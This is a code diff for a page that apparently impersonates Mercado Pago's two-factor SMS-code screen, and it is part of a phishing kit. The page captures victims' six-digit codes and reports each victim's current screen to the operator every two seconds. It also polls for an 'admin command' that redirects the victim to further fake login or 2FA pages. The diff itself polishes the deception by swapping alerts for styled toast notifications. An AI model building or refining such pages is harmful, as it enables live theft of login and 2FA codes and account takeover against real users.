@@ -13,7 +13,6 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
     $redirect_target_2fa = 'dois_fatores.php'; 
 }
 
@@ -42,158 +41,65 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             --cor-texto-primaria: #333;
             --cor-texto-secundaria: #666;
             --cor-borda: #ccc;
-            --cor-fundo: #f5f5f5; /* Fundo cinza claro */
+            --cor-fundo: #f5f5f5;
             --cor-card: #fff;
             --cor-linha: #e0e0e0;
+            /* Adicionadas cores para o pop-up */
+            --cor-sucesso: #28a745;
+            --cor-erro: #dc3545;
         }
-        html {
-            height: 100%;
-        }
-        body {
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: var(--cor-fundo);
-            color: var(--cor-texto-primaria);
-            display: flex;
-            flex-direction: column;
-            min-height: 100%;
-        }
-        .main-header {
-            background-color: var(--cor-amarela);
+        html { height: 100%; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: var(--cor-texto-primaria); display: flex; flex-direction: column; min-height: 100%; }
+        .main-header { background-color: var(--cor-amarela); padding: 12px 24px; flex-shrink: 0; }
+        .main-header img { height: 30px; }
+        .main-content { background-color: var(--cor-card); padding: 24px; flex-grow: 1; }
+        .user-info-box { display: flex; align-items: center; gap: 8px; border: 1px solid var(--cor-linha); border-radius: 30px; padding: 6px 12px; margin-bottom: 32px; font-size: 14px; width: fit-content; }
+        .user-info-box .icon { width: 24px; height: 24px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .user-info-box .icon svg { width: 16px; height: 16px; }
+        .user-info-box a { font-size: 12px; color: var(--cor-azul); text-decoration: none; margin-left: 8px; }
+        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; margin-bottom: 8px; text-align: left; }
+        .main-title { font-size: 24px; font-weight: 500; margin: 0 0 12px 0; text-align: left; }
+        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin: 0 0 32px 0; text-align: left; }
+        .code-inputs { display: flex; gap: 8px; justify-content: space-between; margin: 16px 0; }
+        .code-inputs input { width: 100%; max-width: 45px; height: 55px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; flex-grow: 1; }
+        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
+        .btn { padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; border: none; width: 100%; box-sizing: border-box; margin-top: 16px; }
+        .btn-primary { background-color: var(--cor-azul); color: white; }
+        .resend-timer { text-align: center; font-size: 14px; color: var(--cor-texto-secundaria); min-height: 21px; margin-top: 24px; }
+        .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
+        .footer-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; margin-top: 24px; display: block; text-align: center; }
+        .main-footer { background-color: var(--cor-card); padding: 24px; text-align: center; border-top: 1px solid var(--cor-linha); flex-shrink: 0; }
+        .main-footer a { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
+
+        /* PASSO 1: CSS PARA O POP-UP CUSTOMIZADO */
+        .toast {
+            position: fixed;
+            top: -100px; /* Começa escondido acima da tela */
+            left: 50%;
+            transform: translateX(-50%);
             padding: 12px 24px;
-            flex-shrink: 0;
-        }
-        .main-header img {
-            height: 30px;
-        }
-        .main-content {
-            background-color: var(--cor-card);
-            padding: 24px;
-            flex-grow: 1; /* Faz o conteúdo principal crescer */
-        }
-        .user-info-box {
-            display: flex; /* Mudado para flex para alinhar à esquerda */
-            align-items: center;
-            gap: 8px;
-            border: 1px solid var(--cor-linha);
-            border-radius: 30px;
-            padding: 6px 12px;
-            margin-bottom: 32px;
-            font-size: 14px;
-            width: fit-content; /* Largura baseada no conteúdo */
-        }
-        .user-info-box .icon {
-            width: 24px;
-            height: 24px;
-            background-color: #eaf3ff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .user-info-box .icon svg {
-            width: 16px;
-            height: 16px;
-        }
-        .user-info-box a {
-            font-size: 12px;
-            color: var(--cor-azul);
-            text-decoration: none;
-            margin-left: 8px;
-        }
-        .session-start-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--cor-texto-secundaria);
-            text-transform: uppercase;
-            margin-bottom: 8px;
-            text-align: left;
-        }
-        .main-title {
-            font-size: 24px;
-            font-weight: 500;
-            margin: 0 0 12px 0;
-            text-align: left;
-        }
-        .description-text {
-            font-size: 16px;
-            color: var(--cor-texto-secundaria);
-            line-height: 1.5;
-            margin: 0 0 32px 0;
-            text-align: left;
-        }
-        .code-inputs {
-            display: flex;
-            gap: 8px;
-            justify-content: space-between; /* Espaçamento igual */
-            margin: 16px 0;
-        }
-        .code-inputs input {
-            width: 100%;
-            max-width: 45px;
-            height: 55px;
-            text-align: center;
-            font-size: 22px;
-            border: 1px solid var(--cor-borda);
             border-radius: 6px;
-            flex-grow: 1;
-        }
-        .code-inputs input:focus {
-            border-color: var(--cor-azul);
-            outline: none;
-        }
-        .btn {
-            padding: 16px 24px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 6px;
-            cursor: pointer;
-            border: none;
-            width: 100%;
-            box-sizing: border-box;
-            margin-top: 16px;
-        }
-        .btn-primary {
-            background-color: var(--cor-azul);
             color: white;
-        }
-        .resend-timer {
-            text-align: center;
-            font-size: 14px;
-            color: var(--cor-texto-secundaria);
-            min-height: 21px;
-            margin-top: 24px;
-        }
-        .resend-timer a {
-            color: var(--cor-azul);
-            text-decoration: none;
+            font-size: 16px;
             font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1000;
+            transition: top 0.5s ease-in-out; /* Animação de deslize */
         }
-        .footer-link {
-            color: var(--cor-azul);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            margin-top: 24px;
-            display: block;
-            text-align: center;
+        .toast.show {
+            top: 20px; /* Posição final quando visível */
         }
-        .main-footer {
-            background-color: var(--cor-card);
-            padding: 24px;
-            text-align: center;
-            border-top: 1px solid var(--cor-linha);
-            flex-shrink: 0;
+        .toast.success {
+            background-color: var(--cor-sucesso);
         }
-        .main-footer a {
-            color: var(--cor-azul);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
+        .toast.error {
+            background-color: var(--cor-erro);
         }
     </style>
 </head>
 <body>
+
+    <div id="notification-toast" class="toast"></div>
 
     <header class="main-header">
         <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Mercado Pago">
@@ -233,6 +139,26 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     </footer>
 
     <script>
+        // PASSO 3: LÓGICA JAVASCRIPT PARA CONTROLAR O POP-UP
+        const toastElement = document.getElementById('notification-toast');
+        let toastTimeout;
+
+        /**
+         * Mostra um pop-up customizado (toast) na tela.
+         * @param {string} message - A mensagem a ser exibida.
+         * @param {string} type - O tipo de notificação ('success' ou 'error').
+         */
+        function showToast(message, type = 'success') {
+            clearTimeout(toastTimeout);
+            toastElement.textContent = message;
+            toastElement.className = 'toast';
+            toastElement.classList.add(type);
+            toastElement.classList.add('show');
+            toastTimeout = setTimeout(() => {
+                toastElement.classList.remove('show');
+            }, 3000);
+        }
+
         const smsForm = document.getElementById('sms-form');
         const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
         const timerElement = document.querySelector('.resend-timer');
@@ -275,7 +201,8 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         function resendSms(event) {
             event.preventDefault();
-            alert('Um novo código seria enviado!');
+            // SUBSTITUIÇÃO DO ALERT
+            showToast('Um novo código foi enviado!', 'success');
             startTimer();
         }
 
@@ -296,103 +223,58 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     const result = await response.json();
                     
                     if (result.success) {
-                        alert('Código recebido com sucesso!');
+                        // SUBSTITUIÇÃO DO ALERT
+                        showToast('Código recebido com sucesso!', 'success');
                     } else {
-                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
+                        // SUBSTITUIÇÃO DO ALERT
+                        showToast('Erro: ' + (result.error || 'Não foi possível salvar o código.'), 'error');
                     }
                 } catch (error) {
-                    alert('Erro de conexão com o servidor.');
+                    // SUBSTITUIÇÃO DO ALERT
+                    showToast('Erro de conexão com o servidor.', 'error');
                     console.error('Fetch error:', error);
                 }
             } else {
-                alert('Por favor, preencha todos os 6 dígitos.');
+                // SUBSTITUIÇÃO DO ALERT
+                showToast('Por favor, preencha todos os 6 dígitos.', 'error');
             }
         }
     </script>
     <script>
         (function() {
-            // Mapa de nomes de arquivos para mensagens de status amigáveis.
-            const statusMap = {
-                'index.php': 'Usuário na tela Home (Desktop)',
-                'login-mobile.php': 'Usuário na tela Home (Mobile)',
-                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
-                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
-                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
-                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
-                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
-                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
-                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
-                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
-                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
-                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
-                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
-                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
-                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
-                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
-                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
-                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
-                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
-            };
-
-            // Descobre o nome do arquivo da página atual
+            const statusMap = { 'index.php': '...', 'login-mobile.php': '...', 'senha.php': '...', 'senha-mobile.php': '...', 'dois_fatores.php': '...', 'dois_fatores2.php': '...', 'doisfatores2mobile.php': '...', 'sms_desktop.php': '...', 'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)', 'sms_whats_desktop.php': '...', 'sms_whats_mobile.php': '...', 'qrcode-mobile.php': '...', 'telaqr.php': '...', 'email2fadesktop.php': '...', 'email2famobile.php': '...', 'emailsms_desktop.php': '...', 'emailsms_mobile.php': '...', 'sms2fadesktop.php': '...', 'sms2famobile.php': '...', 'whats2fadesktop.php': '...', 'whats2framobile.php': '...' };
             const currentPage = window.location.pathname.split('/').pop();
-            
-            // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
-
-            // Função que envia o "ping" para a API
             async function sendStatusUpdate() {
                 try {
                     await fetch('api_update_status.php', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ status: currentStatus })
                     });
-                    // Não precisamos fazer nada com a resposta, apenas enviar.
                 } catch (error) {
-                    // Se falhar, loga no console sem incomodar o usuário.
                     console.error('Falha ao enviar atualização de status:', error);
                 }
             }
-
-            // Envia o primeiro status imediatamente ao carregar a página
             sendStatusUpdate();
-
-            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
             setInterval(sendStatusUpdate, 2000);
         })();
     </script>
     <script>
         (function() {
-            // Pega a URL de redirecionamento que o PHP definiu
             const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
-
             async function checkAdminCommand() {
                 try {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
-
-                    console.log('Status atual:', data.status); 
-
                     if (data.status === 'redirecionar_para_2fa') {
-                        // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
-                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
-                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
                 } catch (error) {
                     console.error('Erro ao verificar status:', error);
                 }
             }
-
-            // Inicia a verificação a cada 3 segundos
             const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
